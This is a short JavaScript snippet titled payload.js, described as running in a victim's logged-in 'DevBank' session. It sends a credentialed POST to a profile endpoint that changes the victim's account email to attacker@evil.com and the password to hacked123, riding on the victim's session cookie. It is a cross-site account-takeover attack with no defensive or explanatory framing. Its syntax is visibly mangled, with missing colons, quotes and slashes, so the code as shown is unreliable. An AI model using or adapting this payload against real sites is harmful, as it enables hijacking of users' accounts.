// payload.js — runs in the victim's logged-in DevBank session
fetch(profile, {
    method POST,
    headers { Content-Type applicationx-www-form-urlencoded },
    body email=attacker@evil.com&password=hacked123,    -- the account change
    credentials include                                  send the victim's session cookie
});
